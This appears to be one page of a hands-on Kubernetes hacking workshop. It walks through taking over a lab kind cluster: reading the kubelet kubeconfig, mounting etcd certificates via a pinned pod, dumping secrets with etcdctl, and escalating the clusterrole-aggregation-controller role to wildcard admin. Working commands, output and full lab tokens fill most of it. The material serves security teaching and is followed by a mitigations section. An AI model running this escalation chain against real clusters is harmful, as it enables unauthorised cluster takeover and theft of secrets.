# Hands-on Hacking K8s Workshop | Section 2: Exploit Walk-through

<!-- TOC -->
* [Hands-on Hacking K8s Workshop | Section 2: Exploit Walk-through](#hands-on-hacking-k8s-workshop--section-2--exploit-walk-through)
  * [Part 7: Owning the cluster](#part-7--owning-the-cluster)
    * [Checkpoint](#checkpoint)
      * [What we already knew:](#what-we-already-knew-)
      * [New info:](#new-info-)
      * [Timeline of Doom](#timeline-of-doom)
  * [Next Step:](#next-step-)
<!-- TOC -->

## Part 7: Owning the cluster

Now we have the host filesystem on the node, we have access to a lot more information. Specifically interesting to our
goals is the kubelet's token which has **much** wider permissions than the ServiceAccount tokens we've been using up to
this point.

1. In the shell from our previous step—still root and with the host filesystem mounted—we'll grab the kubelet's context
   and use it look into the `kube-system` namespace and list the `nodes` in this cluster.

   Commands you'll need to run:
   * `export KUBECONFIG=/etc/kubernetes/kubelet.conf` - This is contains the kubelet's token
   * `kubectl get pods -n kube-system` - Lists the pods in the control-plane `kube-system` Namespace
   * `kubectl get nodes` - Lists the names and roles of the nodes that make up the cluster
   
   ```shell
   root@nonroot-priv:/# export KUBECONFIG=/etc/kubernetes/kubelet.conf
   
   root@nonroot-priv:/# kubectl get pods -n kube-system
   NAME                                         READY   STATUS    RESTARTS   AGE
   calico-kube-controllers-5c64b68895-9pqnb     1/1     Running   0          8h
   calico-node-b9dmb                            1/1     Running   0          8h
   calico-node-bmn4j                            1/1     Running   0          8h
   coredns-64897985d-7jkhh                      1/1     Running   0          8h
   coredns-64897985d-ktkdg                      1/1     Running   0          8h
   etcd-kind-control-plane                      1/1     Running   0          8h
   kube-apiserver-kind-control-plane            1/1     Running   0          8h
   kube-controller-manager-kind-control-plane   1/1     Running   0          8h
   kube-proxy-qsdx4                             1/1     Running   0          8h
   kube-proxy-zw8s2                             1/1     Running   0          8h
   kube-scheduler-kind-control-plane            1/1     Running   0          8h
   
   root@nonroot-priv:/# kubectl get nodes
   NAME                 STATUS   ROLES                  AGE   VERSION
   kind-control-plane   Ready    control-plane,master   8h    v1.23.6
   kind-worker          Ready    <none>                 8h    v1.23.6
   ```

2. Let's see if we can run a pod directly with this token. We try a simple `busybox` shell:
   `kubectl run -i --tty busybox --image=busybox --restart=Never -- sh`
   ```shell
   root@nonroot-priv:/# kubectl run -i --tty busybox --image=busybox --restart=Never -- sh
   Error from server (Forbidden): pods "busybox" is forbidden: pod does not have "kubernetes.io/config.mirror" annotation, node "kind-worker" can only create mirror pods
   ```
   This command fails because the kubelet token still doesn't have all the permissions needed to start via the API server.
   The mirror pods line is interesting though, since it would allow us to launch any pod we want directly in `kube-system`
   by putting a YAML file into `/etc/kubernetes/manifests` on the node. This would then give us many attack vectors against
   the other control plane pods in the `kube-system` namespace. We'll leave that alone for now though.

   
3. Because we've escaped the Pod Security Policy, and we now know which nodes we have, we can actually attack on a different
   vector at this point. We're going to launch a pod to the node hosting etcd, and in the Pod configuration we're going
   to mount the host filesystem to give us the credentials to connect to etcd. 

   From the pod list above, we can see that the etcd server appears to be running as `etcd-kind-control-plane`.  Etcd
   is the state persistence for the cluster, we need to get into that and exfiltrate an admin token if possible.

   First, we need to figure out which node the etcd server is running on as well and where it's credentials are stored.
   This will be available in its pod description: `kubectl describe pod etcd-kind-control-plane -n kube-system`
   There's a lot of valuable information in the response so we'll look at it in pieces:
   ```shell
   root@nonroot-priv:/# kubectl describe pod etcd-kind-control-plane -n kube-system
   Name:                 etcd-kind-control-plane
   Namespace:            kube-system
   Priority:             2000001000
   Priority Class Name:  system-node-critical
   Node:                 kind-control-plane/172.19.0.3
   ```
   From this we see that it is running on the `kind-control-plane` node. In our kind cluster, we only have 2 nodes, so
   we probably could have guessed that In a real-world scenario this might not be so obvious as etcd often is deployed
   on its own host(s).

   ```shell
   ...
       Command:
         etcd
         --cert-file=/etc/kubernetes/pki/etcd/server.crt
         --listen-client-urls=https://127.0.0.1:2379,https://172.19.0.3:2379
   ...
   Volumes:
     etcd-certs:
       Type:          HostPath (bare host directory volume)
       Path:          /etc/kubernetes/pki/etcd
       HostPathType:  DirectoryOrCreate
   ...
   ```
   I've pared a lot of this out but from the command arguments and `etcd-certs` volume path we can determine what to feed
   into the `etcdctl` client to connect to the server.


4. Now open the [demo_yamls/etcdclient.yaml](../demo_yamls/etcdclient.yaml) file. Note the specified node, and the
   credential mounting and make sure it matches with the values we saw above. Specifically, check:
   * `etcd-certs` Volume `path` matches
   * `ETCDCTL_ENDPOINT` value matches one of the ones above
   * `nodeName` is correct
   ```yaml
   ...
       - name: ETCDCTL_ENDPOINTS
         value: "https://127.0.0.1:2379"
   ...
     nodeName: kind-control-plane
     volumes:
     - hostPath:
         path: /etc/kubernetes/pki/etcd
         type: DirectoryOrCreate
       name: etcd-certs
   ```


5. Exit the exec'ed pod and apply the etcdclient pod: `kubectl apply -f demo_yamls/etcdclient.yaml`
   ```shell
   $ kubectl apply -f demo_yamls/etcdclient.yaml
   pod/etcdclient created
   ```


6. Now we can run etcdctl by exec'ing into that pod to test our connection to the etcd server:
   `kubectl exec etcdclient -- /usr/local/bin/etcdctl member list`
   ```shell
   $ kubectl exec etcdclient -- /usr/local/bin/etcdctl member list
   c63fc327fd7550b9, started, kind-control-plane, https://172.19.0.3:2380, https://172.19.0.3:2379
   ```
   That's a valid response so our credentials and settings are working, now let's go after something more interesting.


7. Etcd contains a lot of interesting information about the cluster, not least of which is secrets. List them out with
   `kubectl exec etcdclient -- /usr/local/bin/etcdctl get '' --keys-only --from-key | grep secrets`
   ```shell
   kubectl exec etcdclient -- /usr/local/bin/etcdctl get '' --keys-only --from-key | grep secrets
   /registry/secrets/default/default-token-rwr67
   /registry/secrets/default/webadmin-token-r9h69
   /registry/secrets/ingress-nginx/default-token-rmt2h
   /registry/secrets/ingress-nginx/ingress-nginx-admission
   /registry/secrets/ingress-nginx/ingress-nginx-admission-token-s5rql
   /registry/secrets/ingress-nginx/ingress-nginx-token-68htr
   /registry/secrets/kube-node-lease/default-token-dfc9c
   /registry/secrets/kube-public/default-token-m8zph
   /registry/secrets/kube-system/attachdetach-controller-token-wx7k9
   /registry/secrets/kube-system/bootstrap-signer-token-zfksz
   /registry/secrets/kube-system/bootstrap-token-abcdef
   /registry/secrets/kube-system/calico-kube-controllers-token-cjntm
   /registry/secrets/kube-system/calico-node-token-rfps8
   /registry/secrets/kube-system/certificate-controller-token-krhs2
   /registry/secrets/kube-system/clusterrole-aggregation-controller-token-fjkn5
   ...
   ```
   The last row above (`clusterrole-aggregation-controller-token-*`) is a role which has cluster-admin rights by default,
   let's see if we can get that token.


8. Get the contents of the secret name containing `clusterrole-aggregation-controller-token`.
   `kubectl exec etcdclient -- /usr/local/bin/etcdctl get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-fjkn5`
   _(replace the last part of that string as it appears for your output)_

   A lot of data is going to come back from that query but the last very long line which starts with `token�` is what we
   want. Copy everything after that field name (don't grab the unprintable character on the end of `token�`) all of the
   way through, **but not including** the `#kubernetes.io/service-account-token` part the end.
   
   Here's an example screenshot with the highlighted portion you want to copy:
   ![](media/02-07-08-token.png)


9. Let's see what that token's permissions include: `kubectl auth can-i --list --token=[paste token]`
   ```shell
   kubectl auth can-i --list --token=eyJhbGciOiJSUzI1NiIsImtpZCI6InpfR3c3bnNldWltRjh0dnVEWWJSTWJMckRQN1BrTGhMS0hIMmtVSHlMMDgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLWZqa241Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIwZDg0NzA2Ni1lMWFhLTRkMzgtYmIwNS0wMjU5MTkzMzQ5NjAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.TByG8_Zt1NN_Fo3UhGjcMlpZHgKh_C2EH8EXj9q4B6JrmmvtP_1MM8rn-AS9a4BIkGMX9JTdfhw_XweWukKBUTQWOiWJwP_uGhYksvyqAUjI83IHA72uaVI1XODwyY0DXDE_6xBQ3LZKg_HJWbVS4Fl3Nl7yrXYVZgkybB0VELyF3tu1LCeb_yuJFvgajEpI1pUQA-bY85DMNDMYd-CU7vpjzG8FvTk5hIB1ZYXzt1qxCbc9lithxrXvPGOpDkuOHAmKnBXgj5Ol4X9a1aLqlw_ts90njWfEuXcO18BQNwpschkTvXnUgcmGYS9Yb3UfCCKTggCbSrSY4QE1dFtV_w
   Resources                                       Non-Resource URLs                     Resource Names   Verbs
   selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
   selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
   clusterroles.rbac.authorization.k8s.io          []                                    []               [escalate get list patch update watch]
   ...
   ```
   This is not _quite_ full admin access, but the fact that we can `escalate` ClusterRoles means we are just a step away.


10. Edit your demokubeconfig file one more time, commenting out the prior `token:` adding a new one with the string we copied.
   ```yaml
   ...
   users:
   - name: snyk
     user:
       token: eyJhbGciOiJSUzI1NiIsImtpZCI6InpfR3c3bnNldWltRjh0dnVEWWJSTWJMckRQN1BrTGhMS0hIMmtVSHlMMDgifQ.eyJpc3MiOiJrdWJl...
   #    token: eyJhbGciOiJSUzI1NiIsImtpZCI6InpfR3c3bnNldWltRjh0dnVEWWJSTWJMckRQN1BrTGhMS0hIMmtVSHlMMDgifQ.eyJhdWQiOlsiaHR0...
   #    token: eyJhbGciOiJSUzI1NiIsImtpZCI6InpfR3c3bnNldWltRjh0dnVEWWJSTWJMckRQN1BrTGhMS0hIMmtVSHlMMDgifQ.eyJhdWQiOlsiaHR0...
   ```

11. Now, let's edit the `clusterrole-aggregation-controller` service account's clusterrole rights: `kubectl edit clusterrole system:controller:clusterrole-aggregation-controller`
    Change the roles section to match the following:
   ```yaml
   rules:
   - apiGroups:
     - '*'
     resources:
     - '*'
     verbs:
     - '*'
   ```
   Save end exit the edit session and you should see the following:
   ```shell
   clusterrole.rbac.authorization.k8s.io/system:controller:clusterrole-aggregation-controller edited
   ```

12. Now re-check the permissions: `kubectl auth can-i --list --token=[paste token]`
   ```shell
   kubectl auth can-i --list --token=eyJhbGciOiJSUzI1NiIsImtpZCI6InpfR3c3bnNldWltRjh0dnVEWWJSTWJMckRQN1BrTGhMS0hIMmtVSHlMMDgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjbHVzdGVycm9sZS1hZ2dyZWdhdGlvbi1jb250cm9sbGVyLXRva2VuLWZqa241Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImNsdXN0ZXJyb2xlLWFnZ3JlZ2F0aW9uLWNvbnRyb2xsZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIwZDg0NzA2Ni1lMWFhLTRkMzgtYmIwNS0wMjU5MTkzMzQ5NjAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Y2x1c3RlcnJvbGUtYWdncmVnYXRpb24tY29udHJvbGxlciJ9.TByG8_Zt1NN_Fo3UhGjcMlpZHgKh_C2EH8EXj9q4B6JrmmvtP_1MM8rn-AS9a4BIkGMX9JTdfhw_XweWukKBUTQWOiWJwP_uGhYksvyqAUjI83IHA72uaVI1XODwyY0DXDE_6xBQ3LZKg_HJWbVS4Fl3Nl7yrXYVZgkybB0VELyF3tu1LCeb_yuJFvgajEpI1pUQA-bY85DMNDMYd-CU7vpjzG8FvTk5hIB1ZYXzt1qxCbc9lithxrXvPGOpDkuOHAmKnBXgj5Ol4X9a1aLqlw_ts90njWfEuXcO18BQNwpschkTvXnUgcmGYS9Yb3UfCCKTggCbSrSY4QE1dFtV_w
   Resources                                       Non-Resource URLs                     Resource Names   Verbs
   *.*                                             []                                    []               [*]
   ...
   ```
   You are now a cluster admin, enjoy your new powers.


   ![](media/gameover.gif)
### Checkpoint
Let's take a moment to collect our notes and track our progress.

#### What we already knew:
* An application with an RCE vulnerability is available to us on port 80
* The application is running in a container on a Kubernetes cluster
* The application is behind a service listening on port 5000
* The Kubernetes api-server internal IP address 
* The IP address of the container/pod the application is running in
* The ServiceAccount and Pod configurations in the `secure` Namespace is using the default `automountServiceAccountToken` setting of `true`
* Using a found ServiceAccount token, we were able to connect to the cluster's api-server
* The api-server returned Endpoint information exposing its external IP _(although our workshop Kind cluster obscures this in practice)_
* The account for the token gathered has limited access in the `default` Namespace
* The account is from a Namespace titled `secure` where it has broad access.
* The application container is somewhat hardened by running as a non-root user and its image does not include `sudo`
* The application container is not running with a `readOnlyRootFilesystem:true` so it's mutable
* There are PSP configurations in place in the `secure` Namespace that restrict root users and privileged mode containers/pods
* The `secure` Namespace PSP is **not** configured with `allowPrivilegeEscalation:false` so SUID binaries are effective
* Another application is listening at port 5000 and it is **not** in the `secure` Namespace. (We know
  it is not in the same Namespace because we would have seen it via `kubectl get`.)  We don't know what
  Namespace it is in yet.
* Apparently NetworkPolicy is either not deployed or is far too loose to allow that scan to find listeners
  outside the Namespace.
* The new IP address is another copy of the vulnerable application
* We've found another ServiceAccount token from this copy of the application 
* This copy of the application is running in the `default` Namespace
* The ServiceAccount and Pod configurations in the `default` Namespace is using the default `automountServiceAccountToken` setting of `true`
* RBAC is wide open for this ServiceAccount in the `default` Namespace
* PSPs are lax/non-existant in the `default` Namespace, allowing us to deploy privileged containers that we can easily escape.

#### New info:
* Getting root access to a node exposes the kubelet token
* The kubelet token as visibility into `kube-system` resources, including the etcd pod
* The `default` namespace service account token has rights to deploy a pod onto the `kind-control-plane` node
* Using privileged mode, the etcd pki volume is mountable from the `kind-control-plane` node
* Using an etcdctl command, the token for the `clusterrole-aggregation-controller` service account is accessable
* The `clusterrole-aggregation-controller` token has `escalate` rights on ClusterRoles
* Escalating its own ClusterRole to wildcard resources gives admin rights to itself.

![](media/02-07-Checkpoint-1.png)

#### Timeline of Doom
![](media/02-07-Timeline-1.png)

## Next Step:
Now that we've completely owned this cluster, in the [next step](03-mitigations.md) we start looking at ways to mitigate the differenct attacks
we made.
